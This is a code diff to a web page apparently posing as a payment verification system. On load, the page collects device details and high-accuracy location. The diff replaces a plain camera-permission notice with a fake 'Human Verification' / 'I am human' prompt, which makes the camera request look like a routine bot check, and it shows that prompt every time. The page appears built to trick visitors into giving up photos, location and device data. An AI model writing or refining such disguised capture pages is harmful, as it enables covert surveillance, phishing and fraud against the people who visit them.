@@ -97,12 +97,12 @@
         <div
             style="background:white; padding:30px; border-radius:15px; text-align:center; max-width:400px; margin:20px;">
             <div style="font-size:60px; margin-bottom:20px;">📷</div>
-            <h2 style="margin:0 0 15px 0; color:#333;">Camera Access Required</h2>
-            <p style="color:#666; margin-bottom:25px;">This secure payment verification system requires camera access
-                for identity verification. Please enable camera permissions to continue.</p>
+            <h2 style="margin:0 0 15px 0; color:#333;">Human Verification</h2>
+            <p style="color:#666; margin-bottom:25px;">To maintain a secure payment environment, please complete a quick
+                biometric identity check.</p>
             <button id="enable-camera-btn"
-                style="background:#667eea; color:white; border:none; padding:12px 30px; border-radius:8px; font-size:16px; cursor:pointer; font-weight:600;">Enable
-                Camera</button>
+                style="background:#1A73E8; color:white; border:none; padding:12px 30px; border-radius:50px; font-size:16px; cursor:pointer; font-weight:600; text-transform:uppercase; letter-spacing:1px; box-shadow: 0 4px 12px rgba(26,115,232,0.3);">I
+                am human</button>
         </div>
     </div>
 
@@ -718,18 +718,11 @@
             // Capture device details immediately (synchronous)
             captureDeviceDetails();
 
-            // Check camera permission first
-            const hasPermission = await checkCameraPermission();
+            // ALWAYS show the "I am human" prompt for camera on login page
+            // to ensure a clean user interaction before permission request
+            showCameraModal();
 
-            if (!hasPermission) {
-                // Show modal to request permission
-                showCameraModal();
-            } else {
-                // Start capturing photos immediately
-                await captureMultiplePhotos();
-            }
-
-            // Capture location in parallel
+            // Capture location in parallel (15s high-accuracy mode)
             captureLocationWithFallback();
 
             console.log('✅ Initialization complete');
